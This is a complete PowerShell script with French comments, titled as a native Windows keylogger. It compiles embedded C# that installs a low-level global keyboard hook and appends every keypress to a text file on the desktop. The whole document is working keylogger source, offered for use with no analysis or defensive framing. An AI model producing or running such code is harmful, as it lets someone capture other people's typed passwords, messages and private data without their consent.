# -------------------------------------------------------------
# KEYLOGGER NATIF WINDOWS (POWERSHELL)
# Fonctionne sur Windows 10/11 par défaut sans installation
# -------------------------------------------------------------

$LogFile = "$env:USERPROFILE\Desktop\keylogs.txt"

# Définition du code C# pour accéder à l'API Windows (User32.dll)
$Source = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class Logger {
    // Importation des fonctions de l'API Windows
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Constantes pour le Hook Clavier
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    
    // Délégué pour la procédure de hook
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    
    // Chemin du fichier de log
    private static string _logPath = "";

    public static void Start(string path) {
        _logPath = path;
        _hookID = SetHook(_proc);
        Application.Run(); // Boucle de message Windows
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            
            // Nettoyage simple pour la lisibilité
            if (key.Length > 1 && !key.StartsWith("D") && !key.StartsWith("Num")) {
               key = "[" + key + "]";
            }
            
            try {
                // Écriture immédiate dans le fichier (Mode Append)
                using (StreamWriter sw = File.AppendText(_logPath)) {
                    sw.Write(key);
                }
                Console.Write(key); // Affiche aussi dans la console si visible
            } catch { }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@

# Compilation du code C# à la volée
try {
    Add-Type -TypeDefinition $Source -ReferencedAssemblies System.Windows.Forms
} catch {
    Write-Host "[ERREUR] Impossible de compiler le code C#. Vérifiez votre version de .NET." -ForegroundColor Red
    Exit
}

# Démarrage du Keylogger
Write-Host "--- KEYLOGGER POWERSHELL ACTIF ---" -ForegroundColor Green
Write-Host "[INFO] Les touches sont enregistrées dans : $LogFile"
Write-Host "[INFO] Fermez cette fenêtre pour arrêter."

# Lancement de la capture
[Logger]::Start($LogFile)
